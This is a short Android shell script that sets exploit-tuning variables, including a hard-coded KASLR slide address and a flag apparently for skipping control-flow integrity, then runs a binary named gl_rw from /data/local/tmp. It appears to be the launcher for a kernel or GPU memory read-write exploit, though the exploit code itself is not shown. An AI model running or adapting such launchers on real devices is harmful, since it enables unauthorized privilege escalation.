#!/system/bin/sh
export MODE4_ONLY=1
export MODE4_SLIDE_SWAP=1
export KASLR_SLIDE=0x1d80200000
export MODE4_SWAP_NOCFI=1
export MODE4_SWAP_HOLD=1
cd /data/local/tmp
/data/local/tmp/gl_rw; echo EXIT=$?
